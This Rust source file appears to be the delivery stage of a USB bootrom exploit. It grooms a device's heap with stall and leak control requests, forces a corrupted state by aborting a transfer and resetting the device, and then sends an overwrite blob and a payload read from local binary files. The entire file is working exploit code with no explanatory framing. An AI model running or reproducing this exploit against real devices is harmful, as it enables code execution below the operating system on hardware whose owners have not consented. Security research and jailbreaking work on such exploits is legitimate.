use std::{time::Duration, thread::sleep, fs::File, io::Read, ptr::NonNull};
use libusb1_sys::{libusb_reset_device, libusb_open_device_with_vid_pid, libusb_control_transfer};
use crate::usbexec::{reconnect_device, usb_stall, usb_no_leak, usb_req_leak, async_ctrl_transfer, usb_req_stall};

pub fn heap_grooming(vid: u16, pid: u16) {
    unsafe {
        let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), vid , pid);
        reconnect_device(NonNull::new(han).unwrap(), vid, pid, Duration::from_secs(1));
    }

    usb_stall(vid, pid);

    for _ in 0..5 {
        usb_no_leak(vid, pid)
    }
    usb_req_leak(vid, pid);
    usb_no_leak(vid, pid);
    unsafe {
        let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), vid , pid);
        libusb_reset_device(han);
    }
    sleep(Duration::from_micros(500000));
}

pub fn setup_overwrite(vid: u16, pid: u16) {
    let buf: [u8; 0x800] = [0; 0x800];
    println!("Preparing for overwrite...");

    let ret = async_ctrl_transfer(0x21, 1, 0, 0, &buf, 0x800, 1.0, vid, pid);
    if ret != 0 {
        panic!("Failed to prepare overwrite!")
    }
    unsafe {
        let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), vid , pid);
        libusb_control_transfer(han, 0x21, 4, 0, 0, std::ptr::null_mut(), 0, 0);
        libusb_reset_device(han);
    }
    sleep(Duration::from_micros(500000));
}

pub fn load_payloads(vid: u16, pid: u16) {
    let mut overwrite_file = File::open("./bin/overwrite.bin").expect("Can not open ./bin/overwrite.bin");
    let mut overwrite_buf = vec![0; 1524];
    overwrite_file.read_exact(&mut overwrite_buf).unwrap();

    let mut payload_file = File::open("./bin/payload.bin").expect("Can not open ./bin/payload.bin");
    let mut payload_buf = vec![0; 2400];
    payload_file.read_exact(&mut payload_buf).unwrap();

    usb_req_stall(vid, pid);
    usb_req_leak(vid, pid);

    println!("Sending overwrite...");
    unsafe {
        let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), vid , pid);
        // libusb_control_transfer(dev->dev, 0, 0, 0, 0, overwrite_buf, 1524, 100);
        libusb_control_transfer(han, 0, 0, 0, 0, overwrite_buf.as_mut_ptr(), 1524, 100);
    }
    println!("Sending Payload!!!...");
    unsafe {
        let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), vid , pid);
        libusb_control_transfer(han, 0x21, 1, 0, 0, payload_buf.as_mut_ptr(), 2048, 100);
        libusb_control_transfer(han, 0x21, 1, 0, 0, payload_buf[2048..].as_mut_ptr(), 352, 100);
        println!("Resetting device...");
        libusb_reset_device(han);
    }
    
}